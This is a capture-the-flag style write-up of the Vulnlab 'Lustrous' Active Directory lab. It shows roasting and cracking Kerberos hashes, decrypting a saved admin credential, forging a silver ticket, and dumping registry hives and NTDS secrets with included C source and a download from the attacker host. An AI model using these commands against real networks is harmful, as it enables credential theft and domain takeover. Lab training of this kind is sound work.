---
title: Vulnlab - Lustrous
date: 2025-01-17 02:30:00 +/-TTTT
categories: [VulnLab]
tags: [sliver-ticket, BackupOperator]     # TAG names should always be lowercase
image : /assets/images/lustrous_slide.png
---

10.10.194.53
10.10.194.54

## Entry

    ➜  lustrous nxc smb 10.10.194.53

    SMB         10.10.194.53    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)
    ➜  lustrous nxc smb 10.10.194.54

    SMB         10.10.194.54    445    LUSMS            [*] Windows Server 2022 Build 20348 x64 (name:LUSMS) (domain:lustrous.vl) (signing:False) (SMBv1:False)

this is our hosts lets go

    ➜  heron ftp LUSDC
    Connected to LUSDC.
    220 Microsoft FTP Service
    Name (LUSDC:elliot): Anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ls
    229 Entering Extended Passive Mode (|||50100|)
    125 Data connection already open; Transfer starting.
    12-26-21  11:50AM       <DIR>          transfer
    226 Transfer complete.
    ftp> cd transfer
    250 CWD command successful.
    ftp> ls
    229 Entering Extended Passive Mode (|||50101|)
    125 Data connection already open; Transfer starting.
    12-26-21  11:51AM       <DIR>          ben.cox
    12-26-21  11:49AM       <DIR>          rachel.parker
    12-26-21  11:49AM       <DIR>          tony.ward
    12-26-21  11:50AM       <DIR>          wayne.taylor

users list

    ➜  lustrous cat ftp_users.txt | awk '{print $4}'
    ben.cox
    rachel.parker
    tony.ward
    wayne.taylor
    ➜  lustrous cat ftp_users.txt | awk '{print $4}' > users.txt

kerberoas

    lustrous impacket-GetNPUsers 'lustrous.vl/' -usersfile users.txt -dc-ip LUSDC
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    $krb5asrep$23$ben.cox@LUSTROUS.VL:d87c28ea21e5833837de60b3c649667d$5c4761849aeaf1f0854692d80341125d89e599059811346b03085c9123f25bfde3e588618228b7342b2666de7dabedcab4de2cf4f694611237f2693f5047ceeea15e805fdab951ca2b36f2757182721905addb2e56df9eb2c8dd7590e5344d75c381d2ab22fcea051348d94f2c6e1791382db76ee94c83b7f70e99df90ceb58ddaffa5acf6bf250b5cbadb60ba979d34299506e1b535141a5909dddd0607ace8e2d5977c493ddab970a1ed7086098b59733581713e0f37e8e297c7a59d58444051e45828e18e61894bee41fd75f0408247134ffdad464ac02f411eee14c923c3dffbaefcdeeac7a5d015

crack hash

    ➜  lustrous john ben.cox_hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Trinity1         ($krb5asrep$23$ben.cox@LUSTROUS.VL)

full username list

    ➜  bloodhound bloodhound-python -c ALL -u 'ben.cox' -p 'Trinity1' -d lustrous.vl -ns 10.10.194.53

    ➜  bloodhound cat 20250117175000_users.json | jq -r '.data[].Properties.samaccountname' 
    null
    svc_db
    svc_web
    Cameron.Walsh
    Michelle.John
    Donna.Collins
    Colin.Dodd
    Iain.Evans
    Liam.Atkinson
    Allan.Parker
    Joanna.Harvey
    Mitchell.Fuller
    Ben.Cox
    Joanna.Hall
    Jeremy.Clark
    Tony.Ward
    Marian.Elliott
    Hugh.Wilkinson
    Bradley.Hancock
    Tracy.Roberts
    Brenda.Andrews
    Wayne.Taylor
    Rachel.Parker
    Deborah.Harris
    Duncan.Spencer
    krbtgt
    Adminisrator

kerberoas again

    ➜  lustrous impacket-GetUserSPNs -request -dc-ip LUSDC lustrous.vl/ben.cox

    ➜  lustrous john svc_web_hash --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    iydgTvmujl6f     (?)

winrm shell

    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> dir


        Directory: C:\Users\ben.cox\Desktop


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        12/26/2021  10:30 AM           1652 admin.xml
    -a----         1/17/2025  11:13 PM           3147 store-cred.ps1


    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> type admin.xml
    <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
    <Obj RefId="0">
        <TN RefId="0">
        <T>System.Management.Automation.PSCredential</T>
        <T>System.Object</T>
        </TN>
        <ToString>System.Management.Automation.PSCredential</ToString>
        <Props>
        <S N="UserName">LUSMS\Administrator</S>
        <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367</SS>
        </Props>
    </Obj>
    </Objs>
    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> $user = "Administrator"
    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> $pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367" | ConvertTo-SecureString
    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
    *Evil-WinRM* PS C:\Users\ben.cox\Desktop> $cred.GetNetworkCredential() | fl


    UserName       : Administrator
    Password       : XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF
    SecurePassword : System.Security.SecureString
    Domain         :

    ➜  lustrous evil-winrm -i LUSMS -u administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
    lusms\administrator
    *Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
    LusMS

rdesktop

    ➜  lustrous xfreerdp /u:administrator /p:'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF' /w:1566 /h:968 /v:lusms.lustrous.vl:3389

    There is a a web server but we cannot access so lets get RDP shell and look at that.

    admin pass not work so let use other pass

![alt text](<../assets/images/2.png>)

i think there idor vulnerability but we need passwor  i guees..

with svc_web : iydgTvmujl6f we have no notes.

im gonna try directly sliver ticket while we have admin shell

![alt text](<../assets/images/3 (3).png>)

tony.ward is domain admins so lets try with him.

grab sid

    ➜  lustrous rpcclient -U "ben.cox" //LUSDC
    Password for [WORKGROUP\ben.cox]:
    rpcclient $> lookupnames tony.ward
    tony.ward S-1-5-21-2355092754-1584501958-1513963426-1114 (User: 1)

password to ntlm 

    import hashlib

    password = "iydgTvmujl6f"
    password_bytes = password.encode("utf-16le")
    md4_hash = hashlib.new("md4", password_bytes).digest()
    ntlm_hash = md4_hash.hex()
    print(ntlm_hash)

## sliver-ticket

    mimikatz # kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt
    User      : tony.ward
    Domain    : lustrous.vl (LUSTROUS)
    SID       : S-1-5-21-2355092754-1584501958-1513963426
    User Id   : 1114
    Groups Id : *513 512 520 518 519
    ServiceKey: e67af8b3d78df5a02eb0d57b6cb60717 - rc4_hmac_nt
    Service   : HTTP
    Target    : lusdc.lustrous.vl
    Lifetime  : 1/18/2025 12:26:31 AM ; 1/16/2035 12:26:31 AM ; 1/16/2035 12:26:31 AM
    -> Ticket : ** Pass The Ticket **

    * PAC generated
    * PAC signed
    * EncTicketPart generated
    * EncTicketPart encrypted
    * KrbCred generated

    Golden ticket for 'tony.ward @ lustrous.vl' successfully submitted for current session

klist

    c:\ProgramData>klist

    Current LogonId is 0:0x3b7914

    Cached Tickets: (1)

    #0>     Client: tony.ward @ lustrous.vl
            Server: HTTP/lusdc.lustrous.vl @ lustrous.vl
            KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
            Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
            Start Time: 1/18/2025 0:26:31 (local)
            End Time:   1/16/2035 0:26:31 (local)
            Renew Time: 1/16/2035 0:26:31 (local)
            Session Key Type: RSADSI RC4-HMAC(NT)
            Cache Flags: 0
            Kdc Called:

tony.ward password

    PS C:\Users\Administrator> (iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content

    4.png

    <td>
    4
    </td>
    <td>
    Password Reminder
    </td>
    <td>
    U_cPVQqEI50i1X
    </td>
    <td>
    lustrous_tony.ward
    </td>

### Linux Abuse

    ➜  lustrous impacket-ticketer -nthash e67af8b3d78df5a02eb0d57b6cb60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Creating basic skeleton ticket and PAC Infos
    /usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    aTime = timegm(datetime.datetime.utcnow().timetuple())
    [*] Customizing ticket for lustrous.vl/tony.ward
    /usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
    /usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    /usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    [*]     PAC_LOGON_INFO
    [*]     PAC_CLIENT_INFO_TYPE
    [*]     EncTicketPart
    /usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    [*]     EncTGSRepPart
    [*] Signing/Encrypting final ticket
    [*]     PAC_SERVER_CHECKSUM
    [*]     PAC_PRIVSVR_CHECKSUM
    [*]     EncTicketPart
    [*]     EncTGSRepPart
    [*] Saving ticket in tony.ward.ccache

# BackupOperator

[BackupOperatos](https://github.com/Wh04m1001/Random/blob/main/BackupOperators.cpp)

    #include <stdio.h>
    #include <Windows.h>

    void MakeToken() {
        HANDLE token;
        const char username[] = "<username>";
        const char password[] = "<password>";
        const char domain[] = "<domain>";

        if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
            printf("LogonUserA: %d\n", GetLastError());
            exit(0);
        }
        if (ImpersonateLoggedOnUser(token) == 0) {
            printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
            exit(0);
        }
    }

    int main()
    {
        HKEY hklm;
        HKEY hkey;
        DWORD result;
        const char* hives[] = { "SAM","SYSTEM","SECURITY" };
        const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };
        
        //Uncomment if using alternate credentials.
        //MakeToken();

        result = RegConnectRegistryA("\\\\<computername>", HKEY_LOCAL_MACHINE,&hklm);
        if (result != 0) {
            printf("RegConnectRegistryW: %d\n", result);
            exit(0);
        }
        for (int i = 0; i < 3; i++) {

            printf("Dumping %s hive to %s\n", hives[i], files[i]);
            result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
            if (result != 0) {
                printf("RegOpenKeyExA: %d\n", result);
                exit(0);
            }
            result = RegSaveKeyA(hkey, files[i], NULL);
            if (result != 0) {
                printf("RegSaveKeyA: %d\n", result);
                exit(0);
            }
        }
    }

This allows us to connect to the remote registry and use our Backup Operators privileges to copy out SAM/SYSTEM/SECURITY from LusDC to LusMS. In order to use the tool we compile it with Visual Studio & upload it to LusMS. Then we dump the files from the registry on the dc, to “\windows\temp” on the dc:

grab sam system file

    >_ iwr http://10.8.0.2/SeRemoteBackup.exe -outfile SeRemoteBackup.exe
    >_ .\SeRemoteBackup.exe
    Dumping SAM hive to C:\windows\temp\sam.hive
    Dumping SYSTEM hive to C:\windows\temp\system.hive
    Dumping SECURITY hive to C:\windows\temp\security.hive

crack hash

    pypykatz registry --sam sam --security security system
    ...
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e10fc3898a203cbc159f559d8183297:::
    ...
    === LSA Machine account password ===
    History: False
    NT: 66ff...

    We dumped the local administrator hash, if the domain administrator password would be the same we would be done here. If not, we can use the machine account hash to do a proper secretsdump now and use any domain admin to log in:

    impacket-secretsdump 'LusDC$'@10.10.219.197 -hashes :66ff...
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:b8...
    ...

